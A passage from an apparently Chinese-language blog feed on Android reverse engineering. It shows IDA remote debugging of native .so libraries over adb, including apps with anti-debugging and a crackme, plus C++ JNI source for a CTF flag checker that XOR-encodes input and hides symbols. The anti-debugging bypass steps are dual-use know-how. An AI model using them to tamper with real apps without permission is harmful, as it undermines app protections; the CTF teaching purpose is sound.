class="string">"android.permission.READ_EXTERNAL_STORAGE"</span>/&gt;</div><div class="line">&lt;uses-permission android:name=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</div><div class="line">&lt;application</div><div class="line">...</div><div class="line">&lt;/application&gt;</div></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/wy353208214/article/details/50859422" target="_blank" rel="external">https://blog.csdn.net/wy353208214/article/details/50859422</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;android加载器(一般作为插件开发)&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>IDA-so</title>
    <link href="http://yoursite.com/2018/07/18/android_11_idaSo/"/>
    <id>http://yoursite.com/2018/07/18/android_11_idaSo/</id>
    <published>2018-07-18T13:49:18.000Z</published>
    <updated>2018-07-18T12:56:25.528Z</updated>
    
    <content type="html"><![CDATA[<p>动态调试so文件<br><a id="more"></a></p><h1 id="ida调试so文件"><a href="#ida调试so文件" class="headerlink" title="ida调试so文件"></a>ida调试so文件</h1><p>准备<br>将ida目录下的(如果以前调试过就不用了)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">adb push C:\Program Files\IDA <span class="number">7.0</span>\dbgsrv\android_server /data/ctf/ida/</div><div class="line">adb shell </div><div class="line">su</div><div class="line">cd /data/ctf/ida/</div><div class="line">chmod <span class="number">777</span> android_server</div></pre></td></tr></table></figure></p><h1 id="没有反调试so"><a href="#没有反调试so" class="headerlink" title="没有反调试so"></a>没有反调试so</h1><p>开始</p><h2 id="打开一个cmd"><a href="#打开一个cmd" class="headerlink" title="打开一个cmd"></a>打开一个cmd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /data/ctf/ida/</div><div class="line">./android_server</div></pre></td></tr></table></figure><h2 id="在打开一个cmd"><a href="#在打开一个cmd" class="headerlink" title="在打开一个cmd"></a>在打开一个cmd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></div></pre></td></tr></table></figure><p>查看so文件是否加载进内存map中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">adb shell</div><div class="line">ps | grep  &lt;包名&gt;  <span class="comment">//这里会出现pid</span></div><div class="line">cat /proc/&lt;pid&gt;/maps |grep libcheck <span class="comment">//如果运行后没有显示，则没有加载，</span></div></pre></td></tr></table></figure></p><p>如下，成功<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps | grep  zjgsuctf1</div><div class="line">u0_a4     <span class="number">28355</span> <span class="number">248</span>   <span class="number">1005084</span> <span class="number">51896</span> ffffffff <span class="number">4014</span>c6fc S com.example.ese.zjgsuctf1</div><div class="line">cat /proc/<span class="number">28355</span>/maps |grep libcheck</div><div class="line"><span class="number">7b</span>8d3000<span class="number">-7b</span>8d6000 r-xp <span class="number">00000000</span> b3:<span class="number">17</span> <span class="number">630823</span>     /data/app-lib/com.example.ese.zjgsuctf1<span class="number">-1</span>/libcheck.</div><div class="line">so</div></pre></td></tr></table></figure></p><p>不成功，可能需要查看加载位置，可能需要点击一下按钮触发。</p><h2 id="ida打开"><a href="#ida打开" class="headerlink" title="ida打开"></a>ida打开</h2><p>(1)、ida-&gt;Go-&gt;Debugger-&gt;Attach-&gt;Remote ArmLinux/Android denugger<br>(2)、Hostname:127.0.0.1<br>(3)、接着出现一个窗口，右键选择Quick filter-&gt;包名[几个字母就行]，(这里会出现pid和运行包名)-&gt;ok<br>(4)、ctrl+s-&gt;右键选择Quick filter-&gt;lib的名字-&gt;选择可执行的[X-&gt;x]</p><h2 id="计算函数偏移"><a href="#计算函数偏移" class="headerlink" title="计算函数偏移"></a>计算函数偏移</h2><p>静态偏移: 0x988<br>动态基址: 0x7b8d3000<br>动态偏移: 0x988 + 0x7b8d3000 = 0x7b8d3988<br>g-&gt;0x7b8d3988<br>f2下断点</p><h1 id="存在反调试so"><a href="#存在反调试so" class="headerlink" title="存在反调试so"></a>存在反调试so</h1><h2 id="那么怎么知道so文件存在反调试呢？"><a href="#那么怎么知道so文件存在反调试呢？" class="headerlink" title="那么怎么知道so文件存在反调试呢？"></a>那么怎么知道so文件存在反调试呢？</h2><p>答:就是像上面那样做一遍，找到偏移后，运行程序，ida回闪退，那就有反调试了。可能结果如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">The initial autoanalysis has been finished.</div><div class="line">Caching 'Choose segment to jump'... ok</div><div class="line">Debugger: thread <span class="number">5175</span> <span class="function">has <span class="title">exited</span> <span class="params">(code <span class="number">0</span>)</span></span></div><div class="line">Debugger: thread 5176 has exited (code 0)</div><div class="line">Debugger: thread <span class="number">5177</span> <span class="function">has <span class="title">exited</span> <span class="params">(code <span class="number">0</span>)</span></span></div><div class="line">Debugger: thread 5178 has exited (code 0)</div><div class="line">Debugger: thread <span class="number">5179</span> <span class="function">has <span class="title">exited</span> <span class="params">(code <span class="number">0</span>)</span></span></div><div class="line">Debugger: thread 5180 has exited (code 0)</div><div class="line">Debugger: thread <span class="number">5181</span> <span class="function">has <span class="title">exited</span> <span class="params">(code <span class="number">0</span>)</span></span></div></pre></td></tr></table></figure></p><p>接着开始调试具有反调试的so文件。</p><h2 id="打开一个cmd-1"><a href="#打开一个cmd-1" class="headerlink" title="打开一个cmd"></a>打开一个cmd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /data/ctf/ida/</div><div class="line">./android_server</div></pre></td></tr></table></figure><h2 id="在打开一个cmd-1"><a href="#在打开一个cmd-1" class="headerlink" title="在打开一个cmd"></a>在打开一个cmd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></div><div class="line">adb shell am start -D -n 包名/类名  (Android&lt;anifest.xml里)</div></pre></td></tr></table></figure><p>这时候手机会出现Waiting For Debugger,等待调试界面。<br>如:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></div><div class="line">adb shell am start -D com.yaotong.crackme/com.yaotong.crackme.MainActivity</div></pre></td></tr></table></figure></p><h2 id="ida打开-1"><a href="#ida打开-1" class="headerlink" title="ida打开"></a>ida打开</h2><p>1、载入apk的要调试so文件[反编译或者改后缀为zip]、下断点的JNI_Onload处开始下断点。<br>2、Debugger -&gt; Switch-debuge -&gt; Remote ArmLinux/Android denugger<br>3、Debugger -&gt; Process options -&gt; Hostname:127.0.0.1<br>4、Debugger -&gt; Attach to process -&gt; 右键选择Quick filter-&gt;包名[几个字母就行]。</p><h2 id="jdwp协议端口转发"><a href="#jdwp协议端口转发" class="headerlink" title="jdwp协议端口转发"></a>jdwp协议端口转发</h2><p>方法一、<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">adb forward tcp:<span class="number">8700</span> jdwp:ID <span class="comment">//[上面(3)出现的ID]</span></div><div class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=<span class="number">8700</span></div></pre></td></tr></table></figure></p><p>如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">adb forward tcp:<span class="number">8700</span> jdwp:<span class="number">10734</span></div><div class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=<span class="number">8700</span></div></pre></td></tr></table></figure></p><p>方法二、<br>直接打开ddms，选择这个app程序，如果ddms不能显示程序，可以安装XLnstaller.apk</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>f9运行就好了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;动态调试so文件&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>JNI_Onload—c++</title>
    <link href="http://yoursite.com/2018/07/13/android_10_c++_list/"/>
    <id>http://yoursite.com/2018/07/13/android_10_c++_list/</id>
    <published>2018-07-13T13:49:18.000Z</published>
    <updated>2018-07-18T12:56:36.296Z</updated>
    
    <content type="html"><![CDATA[<p>要逆向，必须会正向编写。so文件混淆——jni_load()——c++<br><a id="more"></a></p><h1 id="JNI-Onload编写"><a href="#JNI-Onload编写" class="headerlink" title="JNI_Onload编写"></a>JNI_Onload编写</h1><p>利用JNI_Onload()函数</p><h2 id="check-java"><a href="#check-java" class="headerlink" title="check.java"></a>check.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.example.ese.zjgsuctf;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">check</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> &#123;</div><div class="line">        System.loadLibrary(<span class="string">"check"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String <span class="title">check</span><span class="params">(String sstr)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="check-cpp"><a href="#check-cpp" class="headerlink" title="check.cpp"></a>check.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_example_ese_zjgsuctf1_check.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> JNIREG_CLASS <span class="meta-string">"com/example/ese/zjgsuctf1/check"</span><span class="comment">//指定要注册的类</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></div><div class="line"><span class="keyword">int</span> data;</div><div class="line">Node *Pnext;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">int</span> enc_flag[]=&#123;<span class="number">52</span>,<span class="number">67</span>,<span class="number">41</span>,<span class="number">1</span>,<span class="number">31</span>,<span class="number">85</span>,<span class="number">44</span>,<span class="number">87</span>,<span class="number">46</span>,<span class="number">89</span>,<span class="number">19</span>,<span class="number">111</span>,<span class="number">55</span>,<span class="number">0</span>,<span class="number">46</span>,<span class="number">91</span>,<span class="number">31</span>,<span class="number">69</span>,<span class="number">112</span>,<span class="number">73</span>,<span class="number">20</span>&#125;;</div><div class="line"><span class="function">Node *<span class="title">ceateList</span><span class="params">(<span class="keyword">char</span> *str)</span></span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line"></div><div class="line">Node *pHead = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</div><div class="line">Node *pTail = pHead;</div><div class="line">pTail-&gt;Pnext = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(pHead == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line">    <span class="keyword">while</span>(str[len] != <span class="string">'\0'</span>)</div><div class="line">    &#123;</div><div class="line">        len++ ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">pTail-&gt;data = len;</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</div><div class="line">&#123;</div><div class="line">Node *pNew = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</div><div class="line"><span class="keyword">if</span>(pNew == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">pNew-&gt;data = str[i]^<span class="number">0x30</span>;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">pNew-&gt;data = str[i]^<span class="number">0x40</span>;</div><div class="line">&#125;</div><div class="line">pNew-&gt;Pnext = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">pTail-&gt;Pnext = pNew;</div><div class="line"></div><div class="line">pTail = pNew;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> pHead;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">Node *<span class="title">insert</span><span class="params">(Node *lst,<span class="keyword">int</span> pos,<span class="keyword">int</span> data)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">    Node *pTmp = lst;</div><div class="line"></div><div class="line"><span class="keyword">while</span>(i&lt;pos&amp;&amp;lst!=<span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">lst=lst-&gt;Pnext;</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Node *pNew = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</div><div class="line"><span class="keyword">if</span>(pNew == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">pNew-&gt;data = data;</div><div class="line">pNew-&gt;Pnext = lst-&gt;Pnext;</div><div class="line">lst-&gt;Pnext = pNew;</div><div class="line"></div><div class="line"><span class="keyword">return</span> pTmp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">Node *<span class="title">deletet</span><span class="params">(Node *lst,<span class="keyword">int</span> pos,<span class="keyword">int</span> data)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">    Node *pTmp = lst;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(lst==<span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> lst;</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span>(i&lt;pos&amp;&amp;lst!=<span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">lst=lst-&gt;Pnext;</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Node *pNew = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</div><div class="line"><span class="keyword">if</span>(pNew == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">pNew = lst-&gt;Pnext-&gt;Pnext;</div><div class="line">lst-&gt;Pnext = pNew;</div><div class="line"></div><div class="line"><span class="keyword">return</span> pTmp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(Node *lst,<span class="keyword">int</span> pos)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(lst==<span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span>(i&lt;pos&amp;&amp;lst!=<span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">lst=lst-&gt;Pnext;</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> lst-&gt;data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">Node *<span class="title">reverseList</span><span class="params">(Node *lst)</span></span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(lst==<span class="literal">NULL</span> || lst-&gt;Pnext == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> lst;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Node *pTmp = reverseList(lst-&gt;Pnext);</div><div class="line">lst-&gt;Pnext-&gt;Pnext=lst;</div><div class="line"></div><div class="line">lst-&gt;Pnext = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="keyword">return</span> pTmp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">displayList</span><span class="params">(Node *lst)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">Node *tmp = lst;</div><div class="line"><span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(tmp-&gt;data!=enc_flag[i])</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">i++;</div><div class="line">tmp = tmp-&gt;Pnext;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">crypt</span><span class="params">(<span class="keyword">char</span> *str)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//string str = "y0u_kn0w_Single_1ist";</span></div><div class="line"></div><div class="line">Node *list1 = ceateList(str);</div><div class="line"></div><div class="line"></div><div class="line">list1 = reverseList(list1);</div><div class="line"><span class="keyword">if</span>(displayList(list1))</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//JNI</span></div><div class="line">__attribute__((section (<span class="string">".mytext"</span>)))<span class="function">jstring <span class="title">esecheck</span><span class="params">( JNIEnv* env,jobject thiz,jstring str1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">//LOGV("This is esecheck()");</span></div><div class="line">            <span class="keyword">char</span>* str = (<span class="keyword">char</span>*)env-&gt;GetStringUTFChars(str1, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(str == <span class="literal">NULL</span>) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">int</span> key = crypt(str);</div><div class="line"></div><div class="line">            <span class="keyword">char</span>* tmpstr = <span class="string">"succeeded"</span>;</div><div class="line">            <span class="keyword">if</span>(key)</div><div class="line">            &#123;</div><div class="line">                    jstring rtstr = env-&gt;NewStringUTF(tmpstr);</div><div class="line">                    <span class="keyword">return</span> rtstr;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    tmpstr = <span class="string">"failed!!"</span>;</div><div class="line">                    jstring rtstr = env-&gt;NewStringUTF(tmpstr);</div><div class="line">                    <span class="keyword">return</span> rtstr;</div><div class="line">            &#125;</div><div class="line">&#125;</div><div class="line">     <span class="comment">/**</span></div><div class="line"><span class="comment">     * Table of methods associated with a single class.</span></div><div class="line"><span class="comment">     */</span></div><div class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;<span class="comment">//绑定，注意，V,Z签名的返回值不能有分号“;”</span></div><div class="line">    &#123; <span class="string">"check"</span>, <span class="string">"(Ljava/lang/String;)Ljava/lang/String;"</span>, (<span class="keyword">void</span>*)esecheck&#125;,</div><div class="line">&#125;;</div><div class="line">     <span class="comment">/*</span></div><div class="line"><span class="comment">     * Register several native methods for one class.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">     <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv* env, <span class="keyword">const</span> <span class="keyword">char</span>* className,</span></span></div><div class="line"><span class="function"><span class="params">             JNINativeMethod* gMethods, <span class="keyword">int</span> numMethods)</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">        jclass clazz;</div><div class="line">        clazz = env-&gt;FindClass( className);</div><div class="line">        <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</div><div class="line">            <span class="keyword">return</span> JNI_FALSE;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">return</span> JNI_FALSE;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> JNI_TRUE;</div><div class="line">     &#125;</div><div class="line">     <span class="comment">/*</span></div><div class="line"><span class="comment">     * Register native methods for all classes we know about.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">     <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNatives</span><span class="params">(JNIEnv* env)</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!registerNativeMethods(env,JNIREG_CLASS, gMethods,</div><div class="line">                                      <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])))</div><div class="line">            <span class="keyword">return</span> JNI_FALSE;</div><div class="line">        <span class="keyword">return</span> JNI_TRUE;</div><div class="line">     &#125;</div><div class="line">     <span class="comment">/*</span></div><div class="line"><span class="comment">     * Set some test stuff up.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * Returns the JNI version on success, -1 on failure.</span></div><div class="line"><span class="comment">     */</span></div><div class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">        JNIEnv* env = <span class="literal">NULL</span>;</div><div class="line">        jint result = <span class="number">-1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (vm-&gt;GetEnv((<span class="keyword">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;</div><div class="line">                <span class="keyword">return</span> result;</div><div class="line">         &#125;</div><div class="line"></div><div class="line">        assert(env != <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span> (!registerNatives(env)) &#123;<span class="comment">//注册</span></div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* success -- return valid version number */</span></div><div class="line">        result = JNI_VERSION_1_4;</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">     &#125;</div></pre></td></tr></table></figure><p>Application.mk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line"></div><div class="line">APP_STL:=stlport_static</div></pre></td></tr></table></figure></p><p>Android<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := check</div><div class="line">LOCAL_SRC_FILES := check.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div><div class="line">LOCAL_CFLAGS := -fvisibility=hidden    #隐藏符号表</div></pre></td></tr></table></figure></p><h1 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h1><p>在app目录下的build.gradle中添加<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div 